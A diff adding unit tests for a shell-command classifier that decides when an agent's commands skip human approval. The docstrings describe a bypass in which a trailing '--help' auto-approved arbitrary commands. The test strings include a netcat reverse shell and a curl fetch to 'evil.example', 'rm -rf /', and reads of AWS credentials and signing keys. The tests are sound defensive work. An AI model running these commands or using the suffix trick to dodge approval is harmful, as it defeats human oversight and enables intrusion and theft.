@@ -90,6 +90,116 @@ class TestIsReadOnlyBash:
         assert is_read_only_bash("java -version") is True
         assert is_read_only_bash("some-tool --help") is True
 
+    def test_help_probe_allows_one_bare_subcommand(self):
+        """`<program> <subcommand> --help` is still a usage probe."""
+        assert is_read_only_bash("git log --help") is True
+        assert is_read_only_bash("git rev-parse --help") is True
+        assert is_read_only_bash("terraform plan --help") is True
+        assert is_read_only_bash("cargo --version") is True
+
+    def test_help_suffix_does_not_auto_approve_an_arbitrary_command(self):
+        """A trailing `--help` must not vouch for the command in front of it.
+
+        The classifier used to accept any segment whose first pipe element
+        ended with `--help`/`--version`, so appending the token removed the
+        human approval prompt for arbitrary commands. A shell hands `--help`
+        to the script as $1 instead of printing usage, so the payload still
+        ran.
+        """
+        # Interpreters: the operand is code, and it executes.
+        assert is_read_only_bash("sh /tmp/payload.sh --help") is False
+        assert is_read_only_bash("bash /tmp/payload.sh --version") is False
+        assert is_read_only_bash("/bin/sh /tmp/x.sh --help") is False
+        assert is_read_only_bash("./sh evil.sh --help") is False
+        assert is_read_only_bash("python -c \"import os;os.system('id')\" --help") is False
+        # Destructive operands.
+        assert is_read_only_bash("rm -rf ./proj --help") is False
+        assert is_read_only_bash("chmod 777 /etc/passwd --help") is False
+        # Wrappers that hand off to another program.
+        assert is_read_only_bash("sudo rm -rf / --help") is False
+        assert is_read_only_bash("env sh evil.sh --help") is False
+        assert is_read_only_bash("xargs rm --help") is False
+        assert is_read_only_bash("docker run --rm alpine --help") is False
+        # Network tools: the operand opens a connection.
+        assert is_read_only_bash("nc evil.example 4444 -e /bin/sh --help") is False
+        assert is_read_only_bash("curl http://evil.example/x.sh --help") is False
+
+    def test_help_suffix_does_not_auto_approve_across_segments(self):
+        """Every `&&`/`;` segment is classified, so the suffix cannot chain.
+
+        These are the payloads that combined the suffix with a sensitive-path
+        read or a write to the deny-rule keystone file.
+        """
+        assert is_read_only_bash("cd ~/.kiro/crew --help && cat token_signing.key --help") is False
+        assert (
+            is_read_only_bash("cd ~/.kiro/crew --help && tee denied_commands.json --help") is False
+        )
+        assert is_read_only_bash("V=$HOME --help; awk 1 $V/.aws/credentials --help") is False
+
+    def test_help_probe_rejects_verbose_flags(self):
+        """`-v`/`-V` mean verbose far more often than version.
+
+        `rm victim -v` is three tokens ending in a flag with a bare word in the
+        middle, so a probe check keyed on shape alone reads it as
+        ``<program> <subcommand> <flag>`` — and GNU rm deletes the operand.
+        """
+        assert is_read_only_bash("rm victim -v") is False
+        assert is_read_only_bash("rm victim -V") is False
+        assert is_read_only_bash("rm -rf dir -v") is False
+        assert is_read_only_bash("chmod 777 file -v") is False
+        assert is_read_only_bash("mv a b -v") is False
+        assert is_read_only_bash("cp secret /tmp -v") is False
+        # The two explicit allowlist entries still work — they are matched as
+        # prefixes, not as probes.
+        assert is_read_only_bash("java -version") is True
+        assert is_read_only_bash("python --version") is True
+
+    def test_help_probe_rejects_shell_builtins_that_run_their_operand(self):
+        """`source payload --help` executes `payload` in the current shell.
+
+        These are builtins, not programs on PATH, so the PATH-name requirement
+        does not reach them on its own — `source` and `.` read the operand from
+        the workspace and run it, with `--help` landing as $1.
+        """
+        assert is_read_only_bash("source payload --help") is False
+        assert is_read_only_bash(". payload --help") is False
+        assert is_read_only_bash("exec payload --help") is False
+        assert is_read_only_bash("eval payload --help") is False
+        assert is_read_only_bash("command payload --help") is False
+        assert is_read_only_bash("builtin cd --help") is False
+        assert is_read_only_bash("trap payload --help") is False
+
+    def test_help_probe_rejects_a_program_named_by_path(self):
+        """An unlisted binary may ignore `--help` and run its side effect.
+
+        The denied-program table can only name executors it knows about, so a
+        path-named program has to fail on shape instead: nothing here can be
+        vouched for.
+        """
+        assert is_read_only_bash("./payload --help") is False
+        assert is_read_only_bash("./evil.sh --help") is False
+        assert is_read_only_bash("/tmp/payload --help") is False
+        assert is_read_only_bash("../build/tool --help") is False
+        assert is_read_only_bash("./x --version") is False
+        assert is_read_only_bash("/usr/local/bin/unknown --help") is False
+
+    def test_help_probe_rejects_short_h_beside_a_subcommand(self):
+        """`-h` cannot be told from a real option next to an operand."""
+        assert is_read_only_bash("some-tool subcmd -h") is False
+        # Two tokens is unambiguous, so the short spelling is still accepted.
+        assert is_read_only_bash("some-tool -h") is True
+
+    def test_help_probe_rejects_unparseable_and_prefixed_forms(self):
+        """Deny-by-default when argv cannot be recovered or is not a probe."""
+        # Unbalanced quote: argv is unknown, so the segment is not vouched for.
+        assert is_read_only_bash('some-tool "--help') is False
+        # A VAR=value prefix assigns into the command's environment.
+        assert is_read_only_bash("LD_PRELOAD=/tmp/x.so --help") is False
+        # More than one operand between program and flag.
+        assert is_read_only_bash("npm run deploy --help") is False
+        # An option, not a bare subcommand, in the middle.
+        assert is_read_only_bash("some-tool -f /etc/shadow --help") is False
+
     def test_compound_read_commands(self):
         assert is_read_only_bash("git status && git log --oneline -3") is True
         assert is_read_only_bash("ls -la; echo done") is True
@@ -112,9 +222,7 @@ class TestIsReadOnlyBash:
         assert is_read_only_bash("ls -la 2>&1") is True
         # Compound + pipe chains with a /dev/null sink stay read-only.
         assert is_read_only_bash("grep -r foo . 2>/dev/null | head -20") is True
-        assert (
-            is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True
-        )
+        assert is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True
 
     def test_devnull_does_not_unlock_write_commands(self):
         """The /dev/null exemption must not allowlist a write/exec command."""
